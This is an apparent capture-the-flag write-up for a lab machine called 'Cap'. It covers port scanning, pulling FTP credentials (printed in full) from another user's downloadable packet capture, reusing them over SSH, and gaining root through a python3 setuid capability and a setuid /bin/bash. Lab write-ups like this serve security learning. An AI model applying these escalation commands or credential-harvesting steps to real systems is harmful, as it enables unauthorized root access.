# Cap

---

## Enumeration & Foothold

- nmap TCP scan:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
```

- The website allows to capture packets during 5 seconds then provides the pcap file for download
- Tried capturing the packets of an incorrect FTP password to see if anything would be interesting in the server-side packet capturing, but found nothing
- I can get other people's pcaps, found a cap file in `data/0`, downloaded and got FTP creds off of it
- Creds : `nathan:Buck3tH4TF0RM3!`
- Directories on FTP is `nathan`'s home directory, creds reuse by nathan and i logged in via SSH and got user.txt

---

## Privilege Escalation

- Ran `linpeas.sh` and found the following:

```bash
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

- Would be cool if this is the intended path to root, hence the box name `Cap`
- I think it is, it has setuid capability, ran a test as a poc:

```bash
nathan@cap:/tmp/test$ cat test.py
import os

os.system('whoami')
os.setuid(0)
os.system('whoami')

nathan@cap:/tmp/test$ python3 test.py 
nathan
root
```

- From here, I have all kinds of privesc methods, I just did a simple `chmod u+s /bin/bash` and got root.txt

```bash
nathan@cap:/tmp/test$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
nathan@cap:/tmp/test$ bash -p
bash-5.0#
```

---
